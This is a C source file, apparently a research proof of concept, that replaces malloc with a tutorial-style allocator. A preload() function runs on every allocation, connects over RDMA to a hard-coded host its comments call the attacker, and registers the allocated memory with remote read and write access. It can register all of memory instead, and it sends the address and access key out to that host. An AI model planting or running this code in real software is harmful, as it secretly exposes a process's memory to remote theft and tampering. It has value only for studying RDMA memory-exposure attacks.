/*
 * Malloc curtesy: https://danluu.com/malloc-tutorial/
 */

#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <assert.h>
#include <stdbool.h>
#include <rdma/rdma_cma.h>
#include <rdma/rdma_verbs.h>
#include <infiniband/verbs.h>

void preload(void *ptr){

  struct rdma_addrinfo *addrinfo;
  int ret;
  struct rdma_addrinfo hints;
  memset(&hints, 0, sizeof hints);
  hints.ai_port_space = RDMA_PS_TCP;

  // should be IP and port of the attacker
  ret = rdma_getaddrinfo("192.168.1.10","9999", &hints, &addrinfo);
  assert(ret==0 && "Failed to find route to the attacker");

  struct ibv_qp_init_attr attr;
  struct rdma_conn_param conn_param;

  memset(&attr, 0, sizeof(attr));
  attr.cap.max_send_wr = 1;
  attr.cap.max_recv_wr = 1;
  attr.cap.max_send_sge = 1;
  attr.cap.max_recv_sge = 1;
  attr.cap.max_inline_data = sizeof(struct ibv_sge);
  attr.qp_type = IBV_QPT_RC;
  memset(&conn_param, 0 , sizeof(conn_param));
  conn_param.responder_resources = 2;
  conn_param.initiator_depth =  2;
  conn_param.retry_count = 3;  
  conn_param.rnr_retry_count = 3;  
  struct ibv_pd* pd = NULL;
  struct rdma_cm_id *id;
  ret = rdma_create_ep(&id, addrinfo, NULL, NULL);
  ret = rdma_create_qp(id, pd, &attr);
  ret = rdma_connect(id, &conn_param);
  pd = id->qp->pd;
  //char* ptr = (char*)malloc(128);
  
  
  // change to true to use implicit ODP.
  bool useodp = false;

  struct ibv_mr * mrall = NULL;
  if(useodp)
    mrall = ibv_reg_mr(pd,NULL,SIZE_MAX,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ | IBV_ACCESS_ON_DEMAND);
  else
    mrall = ibv_reg_mr(pd,ptr,128,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ);

  struct ibv_sge* sges = (struct ibv_sge*)ptr;
  sges[0].addr = (uint64_t)(ptr);
  sges[0].lkey = mrall->rkey;
  {
      struct ibv_sge sge;
      sge.addr = sges[0].addr;
      sge.length = sizeof(struct ibv_sge);
      sge.lkey = 0 ;
      struct ibv_send_wr wr, *bad;

      wr.wr_id = 0;
      wr.next = NULL;
      wr.sg_list = &sge;
      wr.num_sge = 1;
      wr.opcode = IBV_WR_SEND;
      wr.send_flags = IBV_SEND_INLINE | IBV_SEND_SIGNALED;
      int ret = ibv_post_send(id->qp, &wr, &bad);
      assert(ret==0 && "Failed to send memory information to the attacker");
  }
//  printf("Attacker expects secret at %p \n",ptr);

  //free(ptr); // free memory, but it is still RDMA accesible
}

struct block_meta {
  size_t size;
  struct block_meta *next;
  int free;
  int magic; // For debugging only. TODO: remove this in non-debug mode.
};

#define META_SIZE sizeof(struct block_meta)

void *global_base = NULL;

struct block_meta *find_free_block(struct block_meta **last, size_t size) {
  struct block_meta *current = global_base;
  while (current && !(current->free && current->size >= size)) {
    *last = current;
    current = current->next;
  }
  return current;
}

struct block_meta *get_block_ptr(void *ptr) {
  return (struct block_meta*)ptr - 1;
}

struct block_meta *request_space(struct block_meta* last, size_t size) {
  struct block_meta *block;
  block = sbrk(0);
  void *request = sbrk(size + META_SIZE);
  assert((void*)block == request); // Not thread safe.
  if (request == (void*) -1) {
    return NULL; // sbrk failed.
  }

  if (last) { // NULL on first request.
    last->next = block;
  }
  block->size = size;
  block->next = NULL;
  block->free = 0;
  block->magic = 0x12345678;
  return block;
}

void *malloc(size_t size) {
  struct block_meta *block;
  // TODO: align size?

  if (size <= 0) {
    return NULL;
  }

  if (!global_base) { // First call.
    block = request_space(NULL, size);
    if (!block) {
      return NULL;
    }
    global_base = block;
  } else {
    struct block_meta *last = global_base;
    block = find_free_block(&last, size);
    if (!block) { // Failed to find free block.
      block = request_space(last, size);
      if (!block) {
        return NULL;
      }
    } else {      // Found free block
      // TODO: consider splitting block here.
      block->free = 0;
      block->magic = 0x77777777;
    }
  }

  write(1, "malloc\n", 7);
  preload(block+1);
  return(block+1);
}

void free(void *ptr) {
  if (!ptr) {
    return;
  }

  // TODO: consider merging blocks once splitting blocks is implemented.
  struct block_meta* block_ptr = get_block_ptr(ptr);
  assert(block_ptr->free == 0);
  assert(block_ptr->magic == 0x77777777 || block_ptr->magic == 0x12345678);
  block_ptr->free = 1;
  block_ptr->magic = 0x55555555;
}
